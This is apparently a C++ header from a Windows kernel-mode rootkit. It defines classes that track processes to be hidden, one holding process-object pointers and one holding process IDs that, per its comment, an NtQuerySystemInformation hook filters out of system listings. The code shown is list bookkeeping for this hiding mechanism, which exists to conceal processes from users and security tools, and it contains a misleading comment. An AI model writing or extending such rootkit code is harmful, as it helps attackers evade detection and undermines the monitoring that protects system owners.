#pragma once
#include "definitions.h"


class HiddenProcesses {
public:
	PVOID HiddenList = NULL;
	ULONG HiddenCount = 0;
	SIZE_T BufferSize = 0;
	BOOL AddToHidden(PEPROCESS AddHidden) {
		PVOID TempHidden = ExAllocatePoolWithTag(NonPagedPool, BufferSize + sizeof(PEPROCESS), 'ThPb');
		if (TempHidden == NULL) {
			return FALSE;
		}
		if (HiddenList != NULL) {
			RtlCopyMemory(TempHidden, HiddenList, BufferSize);
		}
		RtlCopyMemory((PVOID)((SIZE_T)TempHidden + BufferSize), &AddHidden, sizeof(PEPROCESS));
		if (HiddenList != NULL) {
			ExFreePool(HiddenList);
		}
		HiddenList = ExAllocatePoolWithTag(NonPagedPool, BufferSize + sizeof(PEPROCESS), 'HpMb');
		if (HiddenList == NULL) {
			ExFreePool(TempHidden);
			return FALSE;
		}
		RtlCopyMemory(HiddenList, TempHidden, BufferSize + sizeof(PEPROCESS));
		ExFreePool(TempHidden);
		BufferSize += sizeof(PEPROCESS);
		HiddenCount++;
		return TRUE;
	}


	BOOL RemoveFromHidden(ULONG64 ProcessId, ULONG HiddenIndex, PEPROCESS* UnhiddenProcess) {
		PEPROCESS RemoveProcess = NULL;
		PACTEPROCESS CurrentProcess = NULL;
		PVOID TempHidden = NULL;
		ULONG CurrentIndex = 0;
		if (BufferSize == 0 || HiddenCount == 0 || HiddenList == NULL) {
			return FALSE;  // Invalid parameters
		}
		if (HiddenIndex >= HiddenCount) {
			// Search process to remove by PID:
			if (ProcessId == 0) {
				return FALSE;
			}
			for (CurrentIndex = 0; CurrentIndex < HiddenCount; CurrentIndex++) {
				RtlCopyMemory(&CurrentProcess, (PVOID)((ULONG64)HiddenList + (CurrentIndex * sizeof(PEPROCESS))), sizeof(PEPROCESS));
				if ((ULONG64)(CurrentProcess->UniqueProcessId) == ProcessId) {
					HiddenIndex = CurrentIndex;
					break;
				}
			}
			if (CurrentIndex == HiddenCount) {
				return FALSE;
			}
		}
		RtlCopyMemory(&RemoveProcess, (PVOID)((ULONG64)HiddenList + (HiddenIndex * sizeof(PEPROCESS))), sizeof(PEPROCESS));
		TempHidden = ExAllocatePoolWithTag(NonPagedPool, BufferSize - sizeof(PEPROCESS), 'ThPb');
		if (TempHidden == NULL) {
			return FALSE;
		}
		if (HiddenIndex == 0) {
			RtlCopyMemory(TempHidden, (PVOID)((ULONG64)HiddenList + sizeof(PEPROCESS)), BufferSize - sizeof(PEPROCESS));
		}
		else if (HiddenIndex == HiddenCount - 1) {
			RtlCopyMemory(TempHidden, HiddenList, BufferSize - sizeof(PEPROCESS));
		}
		else {
			RtlCopyMemory(TempHidden, HiddenList, HiddenIndex * sizeof(PEPROCESS));
			RtlCopyMemory((PVOID)((ULONG64)TempHidden + HiddenIndex * sizeof(PEPROCESS)), (PVOID)((ULONG64)HiddenList + (HiddenIndex + 1) * sizeof(PEPROCESS)), BufferSize - ((HiddenIndex + 1) * sizeof(PEPROCESS)));
		}
		*UnhiddenProcess = RemoveProcess;  // Save renmoved PEPROCESS pointer to return to caller
		if (HiddenList != NULL) {
			ExFreePool(HiddenList);
		}
		HiddenList = ExAllocatePoolWithTag(NonPagedPool, BufferSize - sizeof(PEPROCESS), 'HpMb');
		if (HiddenList == NULL) {
			ExFreePool(TempHidden);
			return FALSE;
		}
		RtlCopyMemory(HiddenList, TempHidden, BufferSize - sizeof(PEPROCESS));
		ExFreePool(TempHidden);
		BufferSize -= sizeof(PEPROCESS);
		HiddenCount--;
		return TRUE;
	}
};
HiddenProcesses ProcessHide = { 0 };

// Class for handling requested processes to hide with NtQuerySystemInformation hook:
class HideProcessHook {
public:
    PVOID HideBuffer = NULL;
    ULONG HideCount = 0;
    ULONG64 BufferSize = 0;


    BOOL GetFromHideProcess(ULONG* HideIndex, ULONG64* ProcessId) {
        if (HideBuffer == NULL || HideCount == 0 || BufferSize == 0 || ProcessId == NULL || HideIndex == NULL) {
            if (ProcessId != NULL) {
                *ProcessId = 0;
            }
            return FALSE;  // Invalid parameters
        }
        if (*ProcessId == REMOVE_BY_INDEX_PID) {
            if (*HideIndex >= HideCount) {
                *ProcessId = 0;
                return FALSE;
            }
            RtlCopyMemory(ProcessId, (PVOID)((ULONG64)HideBuffer + (*HideIndex * sizeof(ULONG64))), sizeof(ULONG64));
            return TRUE;
        }
        else {
            for (ULONG HiddenIndex = 0; HiddenIndex < BufferSize; HiddenIndex += sizeof(ULONG64)) {
                if (*((ULONG64*)((ULONG64)HideBuffer + HiddenIndex)) == *ProcessId) {
                    *HideIndex = HiddenIndex / sizeof(ULONG64);
                    return TRUE;
                }
            }
            *ProcessId = 0;
            return FALSE;
        }
    }

    BOOL CheckIfSameExists(ULONG64 ProcessId) {
        ULONG64 CurrentProcessId = REMOVE_BY_INDEX_PID;
        for (ULONG HiddenIndex = 0; HiddenIndex < HideCount; HiddenIndex++) {
            if (GetFromHideProcess(&HiddenIndex, &CurrentProcessId) && CurrentProcessId != REMOVE_BY_INDEX_PID) {
                if (ProcessId == CurrentProcessId) {
                    return TRUE;
                }
                CurrentProcessId = REMOVE_BY_INDEX_PID;
            }
        }
        return FALSE;
    }

    BOOL IsFromForbiddenProcesses(ULONG64 ProcessId) {
        return (ProcessId == 0) || (ProcessId == 4) || (ProcessId > 65536);
    }

    BOOL AddToHideProcess(ULONG64 NewProcessId) {
        PVOID TempBuffer = NULL;
        if (IsFromForbiddenProcesses(NewProcessId)) {
            return FALSE;  // Process already hidden
        }
        if (CheckIfSameExists(NewProcessId)) {
            return TRUE;  // Process is already hidden
        }
        if (HideBuffer != NULL) {
            TempBuffer = ExAllocatePoolWithTag(NonPagedPool, BufferSize, 'HpTb');
            if (TempBuffer == NULL) {
                return FALSE;
            }
            RtlCopyMemory(TempBuffer, HideBuffer, BufferSize);
            ExFreePool(HideBuffer);
            HideBuffer = ExAllocatePoolWithTag(NonPagedPool, BufferSize + sizeof(ULONG64), 'HpOl');
            if (HideBuffer == NULL) {
                ExFreePool(TempBuffer);
                return FALSE;
            }
            if (HideBuffer != NULL) {
                RtlCopyMemory(HideBuffer, TempBuffer, BufferSize);
                ExFreePool(TempBuffer);
                RtlCopyMemory((PVOID)((ULONG64)HideBuffer + BufferSize), &NewProcessId, sizeof(ULONG64));
                BufferSize += sizeof(ULONG64);
            }
            else {
                return FALSE;
            }
        }
        else {
            HideBuffer = ExAllocatePoolWithTag(NonPagedPool, sizeof(ULONG64), 'HpOl');
            if (HideBuffer == NULL) {
                return FALSE;
            }
            RtlCopyMemory(HideBuffer, &NewProcessId, sizeof(ULONG64));
            BufferSize = sizeof(ULONG64);
        }
        HideCount++;
        return TRUE;
    }

    BOOL RemoveFromHideProcess(ULONG* HideIndex, ULONG64* RemovedProcess) {
        ULONG64 Removed = 0;
        PVOID TempBuffer = NULL;
        if (RemovedProcess == NULL) {
            RemovedProcess = &Removed;
        }
        if (HideBuffer == NULL || HideCount == 0 || BufferSize == 0) {
            return FALSE;  // Invalid parameters
        }
        if (!GetFromHideProcess(HideIndex, RemovedProcess) || *RemovedProcess == 0) {
            return FALSE;
        }
        if (HideCount == 1) {
            ExFreePool(HideBuffer);
            HideBuffer = NULL;
            BufferSize = 0;
            HideCount = 0;
            return TRUE;
        }
        TempBuffer = ExAllocatePoolWithTag(NonPagedPool, BufferSize - sizeof(ULONG64), 'RpHf');
        if (TempBuffer == NULL) {
            return FALSE;
        }
        if (*HideIndex == 0) {
            RtlCopyMemory(TempBuffer, (PVOID)((ULONG64)HideBuffer + sizeof(ULONG64)), BufferSize - sizeof(ULONG64));
        }
        else if (*HideIndex == HideCount - 1) {
            RtlCopyMemory(TempBuffer, HideBuffer, BufferSize - sizeof(ULONG64));
        }
        else {
            RtlCopyMemory(TempBuffer, HideBuffer, *HideIndex * sizeof(ULONG64));
            RtlCopyMemory((PVOID)((ULONG64)TempBuffer + (*HideIndex * sizeof(ULONG64))), (PVOID)((ULONG64)HideBuffer + ((*HideIndex + 1) * sizeof(ULONG64))), BufferSize - ((*HideIndex + 1) * sizeof(ULONG64)));
        }
        ExFreePool(HideBuffer);
        HideBuffer = TempBuffer;
        BufferSize -= sizeof(ULONG64);
        HideCount--;
        return TRUE;
    }
};
HideProcessHook HookProcessHide;